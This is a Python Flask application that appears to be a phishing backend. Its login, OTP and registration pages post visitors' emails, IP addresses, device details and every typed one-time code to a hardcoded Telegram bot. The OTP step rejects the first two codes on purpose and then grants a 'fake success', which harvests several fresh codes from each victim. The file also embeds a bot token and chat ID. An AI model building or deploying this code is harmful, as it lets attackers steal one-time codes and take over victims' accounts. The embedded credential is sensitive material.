from flask import Flask, render_template, request, redirect, session
from werkzeug.security import generate_password_hash
import sqlite3
import os
import requests
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "dev-secret")


# ---------- TELEGRAM CONFIG ----------
BOT_TOKEN = "8026714020:AAFLrW2HOHOQqvGB1W5caPZsv5dFx-ZYhZw"   # PALITAN MO NG REAL TOKEN
CHAT_ID = "-1003581082109"

def send_to_telegram(message: str):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, data=payload, timeout=5)
    except Exception as e:
        print("Telegram error:", e)


def get_db():
    return sqlite3.connect(
        "users.db",
        timeout=10,
        check_same_thread=False
    )


@app.route("/")
def index():
    return redirect("/login")


# ---------- LOGIN (SEND TO TELEGRAM) ----------
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email", "demo@email.com")
        password = request.form.get("password", "password")

        ip = request.remote_addr
        user_agent = request.headers.get("User-Agent")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # 🔔 LOGIN INPUT MONITORING
        send_to_telegram(f"""
<b>🔐 LOGIN ATTEMPT</b>

📧 Email: <code>{email}</code>
🔑 Password: <code>{'*' * len(password)}</code>
🌐 IP: <code>{ip}</code>
🖥 Device: <code>{user_agent}</code>
⏰ Time: <code>{timestamp}</code>
""")

        db = get_db()
        cursor = db.cursor()

        cursor.execute("SELECT id FROM users LIMIT 1")
        user = cursor.fetchone()

        if not user:
            cursor.execute(
                """
                INSERT INTO users
                (email, username, password, birthday, phone, profile_image)
                VALUES (?, ?, ?, ?, ?, ?)
                """,
                (
                    "demo@email.com",
                    "demo_user",
                    generate_password_hash("password"),
                    "",
                    "",
                    "default.png"
                )
            )
            db.commit()
            user_id = cursor.lastrowid
        else:
            user_id = user[0]

        db.close()

        session["temp_user"] = user_id
        session["otp_attempts"] = 0

        return redirect("/otp")

    return render_template("login.html")


# ---------- OTP (SEND ALL 1–2–3 INPUTS TO TELEGRAM) ----------
@app.route("/otp", methods=["GET", "POST"])
def otp():
    if "temp_user" not in session:
        return redirect("/login")

    error = None
    ip = request.remote_addr
    user_agent = request.headers.get("User-Agent")
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if request.method == "POST":
        otp_code = request.form.get("otp", "N/A")
        session["otp_attempts"] += 1

        # 🔔 SEND EVERY OTP INPUT (ATTEMPT 1, 2, 3)
        send_to_telegram(f"""
🔢 <b>OTP INPUT</b>

⌨️ Code: <code>{otp_code}</code>
🔁 Attempt: <code>{session["otp_attempts"]}</code>
🌐 IP: <code>{ip}</code>
🖥 Device: <code>{user_agent}</code>
⏰ Time: <code>{timestamp}</code>
""")

        # ❌ OTP FAILED (1–2)
        if session["otp_attempts"] < 3:
            error = "Invalid OTP. Please check the code and try again."

        # ✅ OTP SUCCESS (3rd – fake success)
        else:
            session["user_id"] = session["temp_user"]
            session.pop("temp_user")
            session.pop("otp_attempts")

            send_to_telegram(f"""
✅ <b>OTP VERIFIED</b>

👤 User ID: <code>{session["user_id"]}</code>
🌐 IP: <code>{ip}</code>
🖥 Device: <code>{user_agent}</code>
⏰ Time: <code>{timestamp}</code>
""")

            return redirect("/dashboard")

    return render_template("otp.html", error=error)


# ---------- DASHBOARD ----------
@app.route("/dashboard")
def dashboard():
    if "user_id" not in session:
        return redirect("/login")

    db = get_db()
    cursor = db.cursor()
    cursor.execute(
        "SELECT username, email, birthday, phone, profile_image FROM users WHERE id=?",
        (session["user_id"],)
    )
    user = cursor.fetchone()
    db.close()

    return render_template(
        "dashboard.html",
        username=user[0],
        email=user[1],
        birthday=user[2],
        phone=user[3],
        profile_image=user[4]
    )


# ---------- REGISTER (SEND TO TELEGRAM) ----------
@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        email = request.form.get("email", "demo@email.com")
        username = request.form.get("username", "demo_user")
        password = request.form.get("password", "password")
        birthday = request.form.get("birthday", "")
        phone = request.form.get("phone", "")

        hashed = generate_password_hash(password)

        db = get_db()
        cursor = db.cursor()

        cursor.execute(
            """
            INSERT OR IGNORE INTO users
            (email, username, password, birthday, phone, profile_image)
            VALUES (?, ?, ?, ?, ?, ?)
            """,
            (email, username, hashed, birthday, phone, "default.png")
        )
        db.commit()
        db.close()

        send_to_telegram(f"""
🆕 <b>NEW REGISTER</b>

📧 Email: <code>{email}</code>
👤 Username: <code>{username}</code>
""")

        return redirect("/login")

    return render_template("register.html")


# ---------- LOGOUT ----------
@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
